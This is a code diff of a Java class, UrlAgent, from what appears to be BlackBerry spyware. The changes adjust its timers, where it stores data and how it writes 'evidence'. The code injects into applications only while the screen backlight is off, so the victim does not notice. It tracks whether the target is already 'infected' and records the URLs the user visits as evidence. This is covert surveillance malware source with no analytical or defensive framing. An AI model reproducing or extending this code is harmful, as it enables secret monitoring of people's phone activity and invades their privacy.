@@ -11,13 +11,12 @@ package blackberry.agent;
 
 import net.rim.device.api.system.Backlight;
 import blackberry.AppListener;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.evidence.EvidenceType;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
-import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -33,7 +32,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
     AppInjector applicationInjector;
     //Timer applicationTimer;
-    private static final long APP_TIMER_PERIOD = 1000;
+    private static final long APP_TIMER_PERIOD = 5000;
 
     /**
      * Instantiates a new url agent.
@@ -42,7 +41,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
      *            the agent status
      */
     public UrlAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_URL, agentEnabled  , true, "UrlAgent");
+        super(Agent.AGENT_URL, agentEnabled  , Conf.AGENT_URL_ON_SD, "UrlAgent");
         
         //#ifdef URL_FORCED
         enable(true);
@@ -60,6 +59,9 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
+        
+        setPeriod(APP_TIMER_PERIOD);
+        setDelay(APP_TIMER_PERIOD);
     }
 
     public synchronized void actualStart() {
@@ -79,8 +81,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
         }
 
-        if (!applicationInjector.isInfected() && !Backlight.isEnabled()) {
-            menuInject();
+        if (!applicationInjector.isInfected()) {       
+            if(!Backlight.isEnabled()){
+                menuInject();
+            }    
         }
     }
 
@@ -124,6 +128,9 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("parse");
         //#endif
+        
+
+        
         return true;
     }
 
@@ -150,6 +157,8 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#ifdef DEBUG
             debug.info("onBacklightChange, injecting");
             //#endif
+            
+            //TODO: qui bisogna verificare che non avvengano due injection alla volta
             menuInject();
         }
     }
@@ -158,9 +167,13 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("saveUrl: " + url);
         //#endif
-        evidence.createEvidence(null, EvidenceType.CHAT);
-        evidence.writeEvidence(WChar.getBytes(url, true));
+        evidence.createEvidence(null);
+        boolean ret = evidence.writeEvidence(url,  true);
+        if (ret == false) {
+            //#ifdef DEBUG
+            debug.error("Error writing file");
+            //#endif
+        }
         evidence.close();
     }
-
 }
